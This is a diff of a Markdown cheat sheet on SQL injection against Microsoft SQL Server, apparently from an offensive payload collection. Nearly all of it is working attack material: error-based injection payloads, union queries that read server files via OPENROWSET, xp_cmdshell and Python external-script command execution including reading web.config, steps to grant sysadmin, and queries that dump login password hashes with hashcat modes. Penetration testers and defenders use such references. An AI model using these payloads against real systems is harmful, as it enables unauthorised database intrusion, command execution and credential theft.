@@ -7,18 +7,19 @@
 
 * [MSSQL Default Databases](#mssql-default-databases)
 * [MSSQL Comments](#mssql-comments)
-* [MSSQL Database Credentials](#mssql-database-credentials)
 * [MSSQL Enumeration](#mssql-enumeration)
     * [MSSQL List Databases](#mssql-list-databases)
-    * [MSSQL List Columns](#mssql-list-columns)
     * [MSSQL List Tables](#mssql-list-tables)
+    * [MSSQL List Columns](#mssql-list-columns)
 * [MSSQL Union Based](#mssql-union-based)
 * [MSSQL Error Based](#mssql-error-based)
 * [MSSQL Blind Based](#mssql-blind-based)
     * [MSSQL Blind With Substring Equivalent](#mssql-blind-with-substring-equivalent)
 * [MSSQL Time Based](#mssql-time-based)
 * [MSSQL Stacked Query](#mssql-stacked-query)
-* [MSSQL Read File](#mssql-read-file)
+* [MSSQL File Manipulation](#mssql-file-manipulation)
+    * [MSSQL Read File](#mssql-read-file)
+    * [MSSQL Write File](#mssql-write-file)
 * [MSSQL Command Execution](#mssql-command-execution)
     * [XP_CMDSHELL](#xp_cmdshell)
     * [Python Script](#python-script)
@@ -29,6 +30,8 @@
 * [MSSQL Privileges](#mssql-privileges)
     * [MSSQL List Permissions](#mssql-list-permissions)
     * [MSSQL Make User DBA](#mssql-make-user-dba)
+* [MSSQL Database Credentials](#mssql-database-credentials)
+* [MSSQL OPSEC](#mssql-opsec)
 * [References](#references)
 
 
@@ -49,47 +52,34 @@
 | Type                       | Description                       |
 |----------------------------|-----------------------------------|
 | `/* MSSQL Comment */`      | C-style comment                   |
-| `-- -`                     | SQL comment                       |
+| `--`                       | SQL comment                       |
 | `;%00`                     | Null byte                         |
-
-
-## MSSQL Database Credentials
-
-* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
-    ```sql
-    SELECT name, password FROM master..sysxlogins
-    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
-    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
-    ```
-* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
-    ```sql
-    SELECT name, password_hash FROM master.sys.sql_logins
-    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
-    ```
 
 
 ## MSSQL Enumeration
 
-| Description   | SQL Query |
-| ------------- | ----------------------------------------- |
-| DBMS version  | `SELECT @@version`                        |
-| Database name | `SELECT DB_NAME()`                        |
-| Hostname      | `SELECT HOST_NAME()`                      |
-| Hostname      | `SELECT @@hostname`                       |
-| Hostname      | `SELECT @@SERVERNAME`                     |
-| Hostname      | `SELECT SERVERPROPERTY('productversion')` |
-| Hostname      | `SELECT SERVERPROPERTY('productlevel')`   |
-| Hostname      | `SELECT SERVERPROPERTY('edition')`        |
-| User          | `SELECT CURRENT_USER`                     |
-| User          | `SELECT user_name();`                     |
-| User          | `SELECT system_user;`                     |
-| User          | `SELECT user;`                            |
+| Description     | SQL Query |
+| --------------- | ----------------------------------------- |
+| DBMS version    | `SELECT @@version`                        |
+| Database name   | `SELECT DB_NAME()`                        |
+| Database schema | `SELECT SCHEMA_NAME()`                    |
+| Hostname        | `SELECT HOST_NAME()`                      |
+| Hostname        | `SELECT @@hostname`                       |
+| Hostname        | `SELECT @@SERVERNAME`                     |
+| Hostname        | `SELECT SERVERPROPERTY('productversion')` |
+| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |
+| Hostname        | `SELECT SERVERPROPERTY('edition')`        |
+| User            | `SELECT CURRENT_USER`                     |
+| User            | `SELECT user_name();`                     |
+| User            | `SELECT system_user;`                     |
+| User            | `SELECT user;`                            |
 
 
 ### MSSQL List Databases
 
 ```sql
 SELECT name FROM master..sysdatabases;
+SELECT name FROM master.sys.databases;
 
 -- for N = 0, 1, 2, …
 SELECT DB_NAME(N); 
@@ -98,6 +88,25 @@ SELECT DB_NAME(N);
 -- (Only works in MSSQL 2017+)
 SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
 ```
+
+### MSSQL List Tables
+
+```sql
+-- use xtype = 'V' for views
+SELECT name FROM master..sysobjects WHERE xtype = 'U';
+SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
+SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
+
+-- list column names and types for master..sometable
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';
+
+SELECT table_catalog, table_name FROM information_schema.columns
+SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'
+
+-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
+SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
+```
+
 
 ### MSSQL List Columns
 
@@ -109,23 +118,8 @@ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '
 SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 
 
 SELECT table_catalog, column_name FROM information_schema.columns
-```
 
-### MSSQL List Tables
-
-```sql
--- use xtype = 'V' for views
-SELECT name FROM master..sysobjects WHERE xtype = 'U';
-
-SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
-
--- list column names and types for master..sometable
-SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';
-
-SELECT table_catalog, table_name FROM information_schema.columns
-
--- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
-SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
+SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
 ```
 
 
@@ -165,6 +159,13 @@ SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
 
 
 ## MSSQL Error Based
+
+| Name         | Payload         |
+| ------------ | --------------- |
+| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
+| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |
+| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |
+| CAST         | `CAST((SELECT @@version) AS INT)` |
 
 * For integer inputs
 
@@ -249,12 +250,28 @@ IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
     ```
 
 
-## MSSQL Read File
+## MSSQL File Manipulation
+
+### MSSQL Read File
 
 **Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.
 
+
+```sql
+OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
+```
+
+Example:
+
 ```sql
 -1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
+```
+
+
+### MSSQL Write File
+
+```sql
+execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
 ```
 
 
@@ -268,7 +285,7 @@ EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
 EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
 ```
 
-If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
+If you need to reactivate `xp_cmdshell` (disabled by default in SQL Server 2005)
 
 ```sql
 EXEC sp_configure 'show advanced options',1;
@@ -282,7 +299,6 @@ RECONFIGURE;
 > Executed by a different user than the one using `xp_cmdshell` to execute commands
 
 ```powershell
-# Print the user being used (and execute commands)
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
@@ -399,6 +415,21 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```sql
 EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
 ```
+
+
+## MSSQL Database Credentials
+
+* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
+    ```sql
+    SELECT name, password FROM master..sysxlogins
+    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
+    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
+    ```
+* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
+    ```sql
+    SELECT name, password_hash FROM master.sys.sql_logins
+    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+    ```
 
 
 ## MSSQL OPSEC
